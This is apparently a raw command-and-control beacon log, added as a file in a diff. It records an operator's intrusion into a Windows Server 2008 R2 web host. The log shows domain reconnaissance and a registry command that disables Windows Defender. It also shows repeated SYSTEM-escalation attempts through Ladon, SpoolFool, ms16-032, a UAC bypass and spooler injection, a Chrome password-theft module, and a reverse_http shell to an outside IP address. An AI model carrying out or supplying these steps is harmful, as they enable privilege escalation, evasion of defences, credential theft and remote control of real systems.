@@ -1,0 +1,116 @@
+12/13 18:34:09 UTC [metadata] 210.1.58.27 <- 210.1.58.27; computer: TSBIZ; user: Malicious UserName; process: jh.exe; pid: 5604; os: Windows; version: 6.1; build: 7601; beacon arch: x64 (x64)
+12/13 18:36:03 UTC [input] <jhc> getsystem
+12/13 18:36:03 UTC [task] <T1134> Tasked beacon to get SYSTEM
+12/13 18:36:06 UTC [checkin] host called home, sent: 2743 bytes
+12/13 18:36:06 UTC [output]
+received output:
+getsystem failed.
+
+12/13 18:36:24 UTC [task] <> ##############
+12/13 18:36:24 UTC [task] <> ##  查询域  ##
+12/13 18:36:24 UTC [task] <> ##############
+12/13 18:36:24 UTC [task] <T1059> Tasked beacon to run: net view /domain
+12/13 18:36:24 UTC [task] <> ####################################################
+12/13 18:36:24 UTC [task] <> ##  判断主域,域服务器通常会同时作为时间服务器使用  ##
+12/13 18:36:24 UTC [task] <> ####################################################
+12/13 18:36:25 UTC [task] <T1059> Tasked beacon to run: net time /domain
+12/13 18:36:27 UTC [checkin] host called home, sent: 94 bytes
+12/13 18:36:28 UTC [output]
+received output:
+System error 5 has occurred.
+
+Access is denied.
+
+
+
+12/13 18:36:28 UTC [output]
+received output:
+Could not find the domain controller for domain WORKGROUP.
+
+More help is available by typing NET HELPMSG 3913.
+
+
+
+12/13 18:36:55 UTC [task] <T1059> Tasked beacon to run: reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /d 1 /t REG_DWORD
+12/13 18:36:59 UTC [checkin] host called home, sent: 146 bytes
+12/13 18:36:59 UTC [output]
+received output:
+ERROR: Access is denied.
+
+
+
+12/13 18:37:06 UTC [checkin] host called home, sent: 19 bytes
+12/13 18:37:12 UTC [checkin] host called home, sent: 40 bytes
+12/13 18:37:12 UTC [error] could not open D:\*: 5
+12/13 18:37:12 UTC [error] could not open D:\*: 5
+12/13 18:37:18 UTC [checkin] host called home, sent: 130 bytes
+12/13 18:37:19 UTC [error] could not open D:\Web\*: 5
+12/13 18:37:19 UTC [error] could not open D:\Web\*: 5
+12/13 18:37:25 UTC [checkin] host called home, sent: 48 bytes
+12/13 18:37:25 UTC [error] could not open D:\Web\chiangraipao.com\.plesk\*: 5
+12/13 18:38:25 UTC [task] <T1134> Tasked beacon to get SYSTEM
+12/13 18:38:28 UTC [checkin] host called home, sent: 2743 bytes
+12/13 18:38:28 UTC [output]
+received output:
+getsystem failed.
+
+12/13 18:38:45 UTC [task] <T1134> Tasked beacon to enable privileges
+12/13 18:38:45 UTC [task] <T1059> Tasked beacon to run: whoami /priv | find "Enabled"
+12/13 18:38:46 UTC [checkin] host called home, sent: 103 bytes
+12/13 18:38:48 UTC [output]
+received output:
+SeChangeNotifyPrivilege       Bypass traverse checking           Enabled 
+
+
+12/13 18:39:03 UTC [task] <T1093> Tasked beacon to run .NET program: Ladon.exe GetSystem C:\windows\temp\123.exe
+12/13 18:39:13 UTC [checkin] host called home, sent: 1034349 bytes
+12/13 18:39:19 UTC [output]
+received output:
+Ladon 7.5
+Start: 2566-12-14 01:39:18
+Runtime: .net 4.0  ME: x64 OS: x64
+OS Name: Microsoft Windows Server 2008 R2 Standard 
+RunUser: IWPD_40(chr2020Ts) PR: -IsUser
+PID: 6756  CurrentProcess: rundll32
+
+Load GetSystem
+
+
+12/13 18:39:23 UTC [output]
+received output:
+C:\windows\temp\123.exe Not Exists!
+Run: C:\windows\temp\123.exe
+
+
+12/13 18:39:40 UTC [output]
+Ladon SpoolFool 
+
+12/13 18:39:41 UTC [error] Ladon.exe does not exist :(
+12/13 18:40:06 UTC [output]
+Ladon ms16135 
+
+12/13 18:40:06 UTC [error] Ladon.exe does not exist :(
+12/13 18:40:17 UTC [task] <T1093> Tasked beacon to run .NET program: SharpBypassUAC.exe -b eventvwr -e VALUE Base64 encoded command to execute
+12/13 18:40:20 UTC [checkin] host called home, sent: 131223 bytes
+12/13 18:40:21 UTC [output]
+received output:
+ [x] Invalid length for a Base-64 char array or string.
+
+
+12/13 18:40:38 UTC [task] <T1134> Tasked beacon to get SYSTEM via spoolss
+12/13 18:40:38 UTC [task] <T1134> Tasked beacon to enable privileges
+12/13 18:40:38 UTC [output]
+Injecting spooltrigger into PID: 5604
+
+12/13 18:40:39 UTC [checkin] host called home, sent: 20582 bytes
+12/13 18:40:44 UTC [input] <jhc> getsystem
+12/13 18:40:44 UTC [task] <T1134> Tasked beacon to get SYSTEM
+12/13 18:41:17 UTC [output]
+2Ladon ChromePwd
+
+12/13 18:41:17 UTC [error] File /home/jhc/Desktop/cs/Ladon911/Ladon911/res/ChromePwd.dat is not a process assembly (.NET EXE)
+12/13 18:45:08 UTC [output]
+Ladon RunUser  explorer
+
+12/13 18:45:08 UTC [error] Ladon.exe does not exist :(
+12/13 18:53:02 UTC [task] <> Tasked Beacon to run windows/beacon_http/reverse_http (185.254.97.245:1438) ms16-032
